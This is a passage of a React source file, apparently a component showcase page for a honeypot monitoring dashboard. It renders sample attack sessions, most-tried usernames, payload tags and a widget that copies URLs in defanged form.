          <div className="border-y px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
            LiveEventRow compact
          </div>
          {LIVE_EVENTS.slice(0, 3).map((e, i) => (
            <div key={e.id} className={cn(i > 0 && "border-t")}>
              <LiveEventRow event={e} compact />
            </div>
          ))}
        </div>

        <div className="mt-4 overflow-hidden rounded-lg border bg-surface shadow-sm">
          <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
            SessionRow (Attacks list)
          </div>
          {SESSIONS.map((s, i) => (
            <div key={s.session_id} className={cn(i > 0 && "border-t")}>
              <SessionRow session={s} />
            </div>
          ))}
        </div>

        <div className="mt-4 overflow-hidden rounded-lg border bg-surface shadow-sm">
          <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
            EventRow (every type)
          </div>
          <ol className="divide-y">
            {EVENTS.map((e) => (
              <li key={e.id}>
                <EventRow event={e} />
              </li>
            ))}
          </ol>
        </div>
      </Section>

      <Section
        id="charts"
        title="Charts and profiles"
        description="Every chart sits under a finding sentence. Sensor hues only where the series is a sensor; everything else is neutral."
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-5">
          <FindingCard
            className="lg:col-span-5"
            eyebrow="TopList"
            finding='"root" was the most tried username.'
          >
            <TopList
              items={[
                { key: "root", name: "root", label: <code>root</code>, count: 1261, share: 0.31 },
                { key: "admin", name: "admin", label: <code>admin</code>, count: 840, share: 0.21 },
                { key: "pi", name: "pi", label: <code>pi</code>, count: 402, share: 0.1 },
              ]}
            />
          </FindingCard>
          <FindingCard
            className="lg:col-span-5"
            eyebrow="DayBars"
            finding="Active on 9 of the last 14 days, busiest on the last day."
          >
            <DayBars points={SAMPLE_DAYS} />
          </FindingCard>
        </div>

        <div className="mt-4 overflow-hidden rounded-lg border bg-surface shadow-sm">
          <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
            AttackerRow (Attackers list)
          </div>
          <AttackerRow attacker={SAMPLE_ATTACKER} />
        </div>

        <div className="mt-4 grid grid-cols-1 gap-4 lg:grid-cols-2">
          <Specimen label="SegmentedControl (filters, sorts, playback speed, theme)">
            <SegmentedControl
              label="Sort by"
              value={sort}
              onChange={setSort}
              options={[
                { value: "last_seen", label: "Last seen" },
                { value: "sessions", label: "Sessions" },
                { value: "events", label: "Events" },
              ]}
            />
            <SegmentedControl
              label="Playback speed"
              value={speed}
              onChange={setSpeed}
              options={["0.5", "1", "2", "4"].map((v) => ({ value: v, label: `${v}×` }))}
            />
          </Specimen>
          <Specimen label="Terminal palette (always dark, muted, never semantic)">
            <div
              className="flex w-full flex-wrap gap-x-3 gap-y-1 rounded-md p-3 font-mono text-xs"
              style={{ backgroundColor: TERMINAL_BG }}
            >
              {TERMINAL_COLOURS.map((k) => (
                <span key={k} style={{ color: TERMINAL_THEME[k] }}>
                  {k}
                </span>
              ))}
            </div>
          </Specimen>
        </div>
      </Section>

      <Section
        id="trends"
        title="Trends, malware and insights"
        description="Neutral by default. Only the tag the finding is about is red; the tag table keeps a sparkline per tag and a change column."
      >
        <div className="grid grid-cols-1 gap-4">
          <FindingCard
            eyebrow="InsightRow"
            finding="3 things stand out in the last 7 days."
            bodyClassName="px-0 sm:px-0 pt-2 pb-2 sm:pb-2"
          >
            {SAMPLE_INSIGHTS.map((i) => (
              <InsightRow key={i.id} insight={i} />
            ))}
          </FindingCard>
          <FindingCard
            eyebrow="TagTable"
            finding={'"php2shell" is the most common tag, and the only one painted red.'}
            detail="Other payload tags keep a red-outlined diamond."
          >
            <TagTable points={SAMPLE_TAGS} />
          </FindingCard>
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
            <FindingCard eyebrow="NewList" finding="2 usernames were never seen before this week.">
              <NewList field="username" items={SAMPLE_NEW} empty="Nothing new." />
            </FindingCard>
            <Specimen label="CopyDefanged (copies hxxp://dl[.]example[.]com/…)">
              <code className="font-mono text-xs text-fg">http://dl.example.com/bins/x86_64</code>
              <CopyDefanged url="http://dl.example.com/bins/x86_64" />
            </Specimen>
          </div>
        </div>
      </Section>

      <Section
        id="states"
        title="States"
        description="Loading keeps the final layout so nothing jumps. Empty states say what is missing and what to do."
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-3">
          <SkeletonTile />
          <SkeletonCard className="lg:col-span-2" />
          <div className="overflow-hidden rounded-lg border bg-surface lg:col-span-2">
            <SkeletonList rows={4} />
          </div>
          <div className="rounded-lg border bg-surface p-5">
            <SkeletonText lines={4} />
          </div>
          <StatTile label="Loading tile" value={null} loading className="lg:col-span-1" />
          <EmptyState
            className="lg:col-span-2"
            icon={Inbox}
            title="No sessions yet"
            description={
              <>
                The sensors are listening. Run <code className="text-fg">just demo</code> to load
                realistic fake attacks.
              </>
            }
            action={
              <Button variant="outline" size="sm">
                Read the docs
              </Button>
            }
          />
          <EmptyState
            icon={Inbox}
            badge="Coming in M5"
            title="Placeholder"
            description="Used for pages that land later."
            className="lg:col-span-3"
          />
        </div>
      </Section>

      {featureSections.map(({ id, Component }) => (
        <div key={id} data-feature-section={id}>
          <Component />
        </div>
      ))}
    </>
  )
}
